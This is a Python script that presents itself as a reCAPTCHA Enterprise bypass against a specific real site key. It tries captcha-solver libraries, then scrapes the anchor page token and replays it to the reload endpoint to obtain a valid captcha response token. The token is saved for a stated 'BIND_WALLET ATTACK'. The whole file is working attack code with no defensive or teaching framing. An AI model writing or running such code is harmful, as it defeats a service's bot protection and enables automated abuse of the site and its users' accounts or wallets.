#!/usr/bin/env python3
"""
RECAPTCHA ENTERPRISE BYPASS using anchor URL technique

The anchor URL from Jack's browser:
https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k=6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T&co=aHR0cHM6Ly9nbWduLmFpOjQ0Mw..&hl=en&v=A7KpaEASfhDcK0nXxgQEyyYv&size=invisible&anchor-ms=20000&execute-ms=30000&cb=izmsysx7isis
"""
import requests
import re
import json

ANCHOR_URL = "https://www.recaptcha.net/recaptcha/enterprise/anchor?ar=1&k=6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T&co=aHR0cHM6Ly9nbWduLmFpOjQ0Mw..&hl=en&v=A7KpaEASfhDcK0nXxgQEyyYv&size=invisible&anchor-ms=20000&execute-ms=30000&cb=izmsysx7isis"

print("🔥 RECAPTCHA ENTERPRISE BYPASS VIA ANCHOR URL")
print("="*80)

# Method 1: Try freecaptcha
print("\n[Method 1] freecaptcha library")
try:
    from freecaptcha import reCAPTCHAV3Solver
    token = reCAPTCHAV3Solver.solve(ANCHOR_URL)
    print(f"Token: {token[:60] if token else 'None'}...")
    if token:
        print("💀💀💀 GOT TOKEN FROM FREECAPTCHA!")
except Exception as e:
    print(f"Error: {e}")

# Method 2: Try anti-recaptcha
print("\n[Method 2] anti-recaptcha library")
try:
    from anti_recaptcha import reCaptchaV3
    token = reCaptchaV3(ANCHOR_URL)
    print(f"Token: {token[:60] if token else 'None'}...")
    if token:
        print("💀💀💀 GOT TOKEN FROM ANTI-RECAPTCHA!")
except Exception as e:
    print(f"Error: {e}")

# Method 3: Manual anchor URL technique
print("\n[Method 3] Manual anchor URL technique")
print("Fetching anchor page...")

try:
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Step 1: Get the anchor page to extract recaptcha token
    r = session.get(ANCHOR_URL, timeout=10)
    print(f"Anchor status: {r.status_code}")
    
    # Look for the recaptcha-token in the response
    token_match = re.search(r'id="recaptcha-token" value="([^"]+)"', r.text)
    
    if token_match:
        recaptcha_token = token_match.group(1)
        print(f"Found recaptcha-token: {recaptcha_token[:60]}...")
        
        # Step 2: Use this token to get a full response via reload endpoint
        # Extract the 'v' parameter for the reload URL
        v_match = re.search(r'v=([A-Za-z0-9_-]+)', ANCHOR_URL)
        k_match = re.search(r'k=([A-Za-z0-9_-]+)', ANCHOR_URL)
        co_match = re.search(r'co=([A-Za-z0-9_.=-]+)', ANCHOR_URL)
        
        if v_match and k_match:
            v = v_match.group(1)
            k = k_match.group(1)
            co = co_match.group(1) if co_match else ''
            
            reload_url = f"https://www.recaptcha.net/recaptcha/enterprise/reload?k={k}"
            
            payload = {
                'v': v,
                'reason': 'q',
                'c': recaptcha_token,
                'k': k,
                'co': co,
                'hl': 'en',
                'size': 'invisible',
                'chr': '%5B89%2C64%2C27%5D',
                'vh': '13599012192',
                'bg': 'undefined',
            }
            
            print(f"Calling reload endpoint...")
            r = session.post(reload_url, data=payload, timeout=10)
            print(f"Reload status: {r.status_code}")
            
            # Extract token from response
            # Response format: )]}'\n["rresp","TOKEN",null,120,null,null,null,null,null,null,null,null,null]
            token_match2 = re.search(r'"rresp","([^"]+)"', r.text)
            
            if token_match2:
                final_token = token_match2.group(1)
                print(f"\n💀💀💀 GOT RECAPTCHA TOKEN: {final_token[:60]}...")
                print(f"Full length: {len(final_token)}")
                
                # NOW USE THIS TOKEN FOR VERIFY_CAPTCHA!
                print("\n" + "="*80)
                print("USING TOKEN FOR BIND_WALLET ATTACK")
                print("="*80)
                
                # Save token for use
                with open('/tmp/captcha_token.txt', 'w') as f:
                    f.write(final_token)
                print(f"Token saved to /tmp/captcha_token.txt")
                
            else:
                print(f"No token in reload response")
                print(f"Response: {r.text[:300]}")
    else:
        print("No recaptcha-token found in anchor page")
        print(f"Page content: {r.text[:500]}")
        
except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
